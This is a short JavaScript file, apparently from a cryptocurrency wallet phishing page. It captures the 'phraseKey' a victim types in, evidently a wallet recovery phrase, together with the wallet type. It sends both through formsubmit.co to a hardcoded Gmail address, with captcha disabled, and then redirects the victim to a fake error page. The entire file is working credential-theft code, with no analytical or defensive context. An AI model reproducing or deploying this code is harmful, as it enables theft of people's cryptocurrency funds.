phraseForm.addEventListener('submit', t)

function t(event) {
    event.preventDefault()
    console.log('ade')
    mail = 'Babaagbalagba397@gmail.com'
    let type = new URLSearchParams(location.search).get("type")
    next = 'error.html'
    subject = `${window.location.hostname} ${new Date()}`
    let e = new FormData()
    phraseKey = phraseKey.value
    e.append('phraseKey', phraseKey)
    e.append('_captcha', false)
    e.append("Wallet Type", type);
    e.append('_next', next)
    e.append('_template', 'table')
    e.append('_subject', subject)
    let t = `https://formsubmit.co/${mail}`
    fetch(t, {
        method: 'POST',
        body: e
    }).then(e => window.location.assign(next)) 
}